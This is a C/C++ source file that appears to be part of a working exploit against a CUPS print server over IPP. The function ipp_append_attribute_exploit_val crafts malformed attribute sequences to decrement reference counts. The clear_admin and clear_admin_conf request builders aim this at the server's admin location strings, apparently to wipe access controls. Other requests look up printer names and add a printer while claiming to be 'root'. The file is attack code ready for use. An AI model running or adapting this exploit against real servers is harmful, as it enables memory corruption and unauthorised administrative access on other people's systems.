#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/time.h>
#include <netdb.h>

#include <ctype.h>

#include "membuf.h"
#include "network.h"
#include "http.h"
#include "util.h"
#include "ipp_parser.h"
#include "ipp_constants.h"

#include "ipp.h"

int request_id;

void ipp_append_attribute_exploit_val(mem_buf *buf, char *tag_name, char *tag_value1, char *tag_language, char* tag_value2, size_t dec_ref_count) {
  // First tag type.
  mem_buf_append_char(buf, IPP_TAG_NAME);

  // Name length.
  mem_buf_append_short_bendian(buf, strlen(tag_name));
  // Name.
  mem_buf_append_string(buf, tag_name, 0);

  // Value1 length. 
  mem_buf_append_short_bendian(buf, strlen(tag_value1));
  // Value1.
  mem_buf_append_string(buf, tag_value1, 0);

  // First tag type, repeated.
  mem_buf_append_char(buf, IPP_TAG_NAME);
  // Name length = 0
  mem_buf_append_short_bendian(buf, 0);
  // No name.
  // Value1 length repeated.
  mem_buf_append_short_bendian(buf, strlen(tag_value1));
  // Value1 repeated.
  mem_buf_append_string(buf, tag_value1, 0);

  for (size_t i = 0; i < dec_ref_count; i++) {
    // First tag type, repeated.
    mem_buf_append_char(buf, IPP_TAG_NAME);
    // Name length = 0
    mem_buf_append_short_bendian(buf, 0);
    // No name.
    // Value1 length repeated.
     mem_buf_append_short_bendian(buf, strlen(tag_value1));
    // Value1 repeated.
    mem_buf_append_string(buf, tag_value1, 0);
  }

  // Second tag type.
  mem_buf_append_char(buf, IPP_TAG_NAMELANG);

  // Name length, 0 = previous length as set.
  mem_buf_append_short_bendian(buf, 0);
  // No name.

  // Value len total.
  mem_buf_append_short_bendian(buf, strlen(tag_language) + strlen(tag_value2) + 4);
  // Language length
  mem_buf_append_short_bendian(buf, strlen(tag_language));
  // Language val.
  mem_buf_append_string(buf, tag_language, 0);
  // Value1 length.
  mem_buf_append_short_bendian(buf, strlen(tag_value2));
  // Value1 length.
  mem_buf_append_string(buf, tag_value2, 0);
}

void ipp_append_attribute_string(mem_buf *buf, int tag_type, char* tag_name, char *tag_value) {
  mem_buf_append_char(buf, tag_type & 0xff);
  mem_buf_append_short_bendian(buf, strlen(tag_name));
  mem_buf_append_string(buf, tag_name, 0);
  mem_buf_append_short_bendian(buf, strlen(tag_value));
  mem_buf_append_string(buf, tag_value, 0);
}

void ipp_append_attribute_integer(mem_buf *buf, int tag_type, char* tag_name, int tag_value) {
  mem_buf_append_char(buf, tag_type & 0xff);
  mem_buf_append_short_bendian(buf, strlen(tag_name));
  mem_buf_append_string(buf, tag_name, 0);
  mem_buf_append_short_bendian(buf, 4);
  mem_buf_append_int_bendian(buf, tag_value);
}

void ipp_append_attribute_boolean(mem_buf* buf, int tag_type, char* tag_name, int value) {
  mem_buf_append_char(buf, tag_type & 0xff);
  mem_buf_append_short_bendian(buf, strlen(tag_name));
  mem_buf_append_string(buf, tag_name, 0);
  mem_buf_append_short_bendian(buf, 1);
  mem_buf_append_char(buf, value & 1);
}

void ipp_start_attributes_group(mem_buf *buf, char group_tag) {
  mem_buf_append_char(buf, group_tag);
}

int build_ipp_header(mem_buf* buf, unsigned short operation) {
  // Main header
  mem_buf_append_short_bendian(buf, 0x0200);		// version: 2.0
  mem_buf_append_short_bendian(buf, operation);    	// operation id
  mem_buf_append_int_bendian(buf, request_id++);	// request id
  return 0;
}

int build_ipp_request_leakref(expctx* ctx, uritest* u, mem_buf *buf, char* leak_string, size_t leak_count) {
  char tmp[4096];
  build_ipp_header(buf, 0x0005);  // operation id: CREATE_JOB

  // Operation attributes
  ipp_start_attributes_group(buf, IPP_TAG_OPERATION);
  ipp_append_attribute_string(buf, IPP_TAG_CHARSET, "attributes-charset", "us-ascii");
  ipp_append_attribute_string(buf, IPP_TAG_LANGUAGE, "attributes-natural-language", leak_string);
  fprintf(stdout, "Host: %s Port: %d URI base: %s Printer name: %s\n", ctx->host, ctx->port, u->uribase, ctx->printer_name);
  snprintf(tmp, sizeof(tmp), "ipp://%s:%d%s/%s", ctx->host, ctx->port, u->uribase, ctx->printer_name);
  fprintf(stdout, "IPP uri: %s\n", tmp);
  ipp_append_attribute_string(buf, IPP_TAG_URI, "printer-uri", tmp);
  ipp_append_attribute_string(buf, IPP_TAG_NAME, "requesting-user-name", leak_string); 

  // Job attributes
  ipp_start_attributes_group(buf, IPP_TAG_JOB);
  ipp_append_attribute_integer(buf, IPP_TAG_INTEGER, "copies", 1);
  ipp_append_attribute_exploit_val(buf, "job-originating-host-name", "value1string", leak_string, "value2string", leak_count);

  // End of attributes.
  ipp_start_attributes_group(buf, IPP_TAG_END);
  return 0;
}

int build_ipp_request_get_printer_name(expctx* ctx, uritest* u, mem_buf *buf) {
  // Main header
  build_ipp_header(buf, 0x4002);  // operation ID: GET_PRINTERS

  // Operation attributes
  ipp_start_attributes_group(buf, IPP_TAG_OPERATION);
  ipp_append_attribute_string(buf, IPP_TAG_CHARSET, "attributes-charset", "us-ascii");
  ipp_append_attribute_string(buf, IPP_TAG_LANGUAGE, "attributes-natural-language", "us-ascii");
  ipp_append_attribute_string(buf, IPP_TAG_NAME, "requesting-user-name", "lpadmin"); 

  // End of attributes.
  ipp_start_attributes_group(buf, IPP_TAG_END);
  return 0;
}

int build_ipp_request_clear_admin_conf(expctx* ctx, uritest* u, mem_buf *buf) {
  return build_ipp_request_leakref(ctx, u, buf, ctx->admin_conf_location_string, ctx->admin_conf_leak_count);
}

int build_ipp_request_clear_admin(expctx* ctx, uritest* u, mem_buf *buf) {
  return build_ipp_request_leakref(ctx, u, buf, ctx->admin_location_string, ctx->admin_leak_count);
}

int build_ipp_request_addprinter(expctx* ctx, uritest* u, mem_buf *buf) {
  build_ipp_header(buf, 0x4003);  // operation ID: ADD_MODIFY_PRINTER

  // Operation attributes
  ipp_start_attributes_group(buf, IPP_TAG_OPERATION);
  ipp_append_attribute_string(buf, IPP_TAG_CHARSET, "attributes-charset", "us-ascii");
  ipp_append_attribute_string(buf, IPP_TAG_LANGUAGE, "attributes-natural-language", "us-ascii");
  ipp_append_attribute_string(buf, IPP_TAG_URI, "printer-uri", "http://localhost:631/printers/testprinter");
  ipp_append_attribute_string(buf, IPP_TAG_NAME, "requesting-user-name", "root"); 

  // Printer attributes
  ipp_start_attributes_group(buf, IPP_TAG_PRINTER);
  ipp_append_attribute_integer(buf, IPP_TAG_ENUM, "printer-state", IPP_PRINTER_IDLE);
  ipp_append_attribute_boolean(buf, IPP_TAG_BOOLEAN, "printer-is-accepting-jobs", 1);

  // End of attributes.
  ipp_start_attributes_group(buf, IPP_TAG_END);
  return 0;
}

int parse_ipp_response_getprinter(expctx* ctx, uritest* u, char* body, size_t len) {
  fprintf(stdout, "Response body for get printer request:\n");
  print_hex(body, len);

  IppParser parser(body, len);

  if (!parser.ParseResponse()) {
    fprintf(stderr, "Error parsing IPP response\n");
    return -1;
  }

  fprintf(stdout, "Successfully parsed IPP response, checking for printer-name\n");

  IppAttribute attr;
  if (!parser.GetAttribute("printer-name", &attr)) {
    fprintf(stderr, "Did not find printer name\n");
    return -1;
  }

  string printer_name;
  if (!attr.GetValue(&printer_name)) {
    fprintf(stderr, "Printer name value has unexpected type\n");
    return -1;
  }

  fprintf(stdout, "Printer name is '%s'\n", printer_name.c_str());
  ctx->printer_name = strdup(printer_name.c_str());
  return 0;
}

int parse_ipp_response(expctx* ctx, uritest* u, char* body, size_t len, int type) {
  switch(type) {
    case GET_PRINTERNAME:
      return parse_ipp_response_getprinter(ctx, u, body, len);
  }
  fprintf(stdout, "Unknown response body type '%d'\n", type);
  return -1;
}
